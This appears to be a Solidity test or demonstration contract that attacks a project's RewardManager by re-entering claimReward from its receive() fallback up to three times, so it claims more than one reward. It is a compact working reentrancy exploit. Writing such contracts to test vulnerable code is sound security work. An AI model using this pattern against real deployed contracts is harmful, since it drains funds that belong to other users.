// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../src/RewardManager.sol";

interface IRewardManager {
    function claimReward() external;
}

contract ReentrantContract {
    IRewardManager public rewardManager;
    uint public attackCount = 0;
    uint public constant MAX_ATTACKS = 3;

    constructor(address _rewardManager) {
        rewardManager = IRewardManager(_rewardManager);
    }

    // Function to initiate the attack
    function attack() external {
        console.log("attacker is attempting to claim more rewards");
        rewardManager.claimReward();
    }

    // Fallback function used to re-enter the claimReward function
    receive() external payable {
        if (attackCount < MAX_ATTACKS) {
            attackCount++;
            rewardManager.claimReward();
        }
    }
}
